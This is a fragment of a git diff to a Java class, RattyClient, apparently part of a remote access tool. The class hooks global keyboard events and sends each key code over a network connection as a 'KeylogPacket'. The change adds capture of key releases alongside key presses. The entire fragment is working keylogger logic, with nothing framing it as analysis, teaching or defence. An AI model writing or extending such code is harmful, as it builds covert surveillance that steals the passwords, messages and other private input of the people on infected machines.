@@ -58,14 +58,17 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 			@Override
 			public void nativeKeyPressed(final NativeKeyEvent n) {
 				final int keyCode = n.getKeyCode();
-				final KeylogPacket packet = new KeylogPacket(keyCode);
+				final KeylogPacket packet = new KeylogPacket(keyCode, KeylogPacket.PRESSED);
 				
 				connection.addPacket(packet);
 			}
 			
 			@Override
 			public void nativeKeyReleased(final NativeKeyEvent n) {
-				//...
+				final int keyCode = n.getKeyCode();
+				final KeylogPacket packet = new KeylogPacket(keyCode, KeylogPacket.RELEASED);
+				
+				connection.addPacket(packet);
 			}
 			
 			@Override
